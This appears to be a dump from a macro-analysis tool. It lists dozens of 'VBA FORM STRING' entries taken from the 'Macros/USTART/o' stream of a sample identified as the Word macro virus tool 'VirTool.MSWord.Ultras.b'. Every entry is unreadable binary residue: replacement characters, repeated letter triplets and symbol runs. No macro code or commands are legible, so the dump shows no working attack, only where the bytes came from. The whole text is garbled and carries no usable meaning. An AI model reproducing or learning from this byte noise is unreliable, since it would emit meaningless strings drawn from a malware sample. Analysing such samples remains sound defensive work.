-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PP�������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�  ����������������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I@@t������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
NNO������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
   "!!###$$$&%%'&&('')((*)),**-+,.--.../pqq���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6C&3?&08%-4%*/$'*$$'!!# 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%@@_������������``�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  !%%&zz{������������������HHKLLOPPTSSWWW[ZZ_^^caafddiggl������������ttzvv|xx~xx�xx�ww�ww�vv�vv����������������������������������������vv�vv�ww�ww�ww�wx�xx�xx�yyxx~ww}vv|ttzssxqqwoou���������������bbf__d\\`YY]VVZRRVOOSKKOGGKCCF??B::=668113,,.'')""#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@B����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�  ����������������������������pp�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P@@y������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
			


-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
KKK������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
   "!!###$$$%%%'&&('()()**+*+,+,/+HKF���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6D%3>&09&-5&+0$'+#$(""$!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZZ[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@Z�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q@@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  !%%&))+UUW���������������HHKLLOPPTSSWWW[ZZ_^^caafddiggl������������ttzvv|xx~xy�xx�ww�ww�vv�vv����������������������������������������ww�ww�ww�xx�xx�xx�yyxx~ww}vv{ttzssxqqwoounnsllq���������������^^b[[_XX\UUYRRVNNRKKNGGJCCF??B;;>669224::<^^_##%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@G����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������  �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ɏ��������������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�  �@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X@@������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	GGG������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
   !!!#""$$$%%&%&(&(*&),'+/'������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6D&3?&0:&-4&+0%(,$%(##%" ! ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���KKK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@U���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I@@z���PP�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  !%%&))+..0���������������HHKLLOOOSSSWWW[ZZ_^^baafddiggl������������ttzvv|xx~yyxx�ww�ww�vv�vv����������������������������������������ww�xx�xx�xy�yyxx~ww}vv{ttzssxqqwppunntllrjjphhn���������������ZZ_WW\TTXQQUNNRJJNGGJCCF??B;;>77:225..0lln[[\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@L����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�  ����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�������������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`@@�������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
DDD������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  ! !#!#%"$'"&+"CH>���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6D&3>'0:'/6&,1&).%&)$$&#!#!efe
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���[[\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@P���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q���@@z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  !$$&))+..0�������������GGKKKOOOSSSWWW[ZZ_^^baafddiggl������������ttzvv|xx~yyxx�ww�ww�vw�vv����������������������������������������xx�xx�yyxx~ww}vv|ttzssyrrwppv���������������������������������VV[TTXPPTMMQJJNGGJCCF??B;;>77:336//1**,���XXY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@Q����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_@@}����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_@@�������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h@@�������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@A������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
		



-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
MMN������PPQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7E&4?'1:'/6&,1&)-%'*$%'$"$"XYX
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ӈ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
			EEF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@K���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>���00h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a@@����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������UUU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!$$&))+--0eeh������������GGKKKOOOSSSWVV[ZZ^]]baaeddiggl������������ssyvv{xx}yyxx�xx�ww�ww�vv����������������������������������������xx�yyxx~vv|uu{ttyrrxqqvoounns���������������������������������SSWPPTMMQJJMFFJCCF??B;;>88:336//2++-&&(���VVV
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@V����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^@@}����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y������������������PP�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o@@�������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@F������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
		



-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JJJ���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7E&4@&1:(/6(,2'*-&'*%%(%#%#/0/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@F���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[pp����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!$$&))+--0224������������GGKKKOOOSRRWVVZZZ^]]b``ecchffk������������ssyuu{ww}yyxx�xx�ww�ww�vw����������������������������������������yyxx~vv|uu{ssyrrwppvnntmmrkkp���������������������������������OOSLLPIIMFFJCCF??B<<?88;446002,,.'')hhi���SSS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@[����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\@@|����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V@@����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�``����������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/USTART/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w@@�������������������������
-------------------------------------------------------------------------------
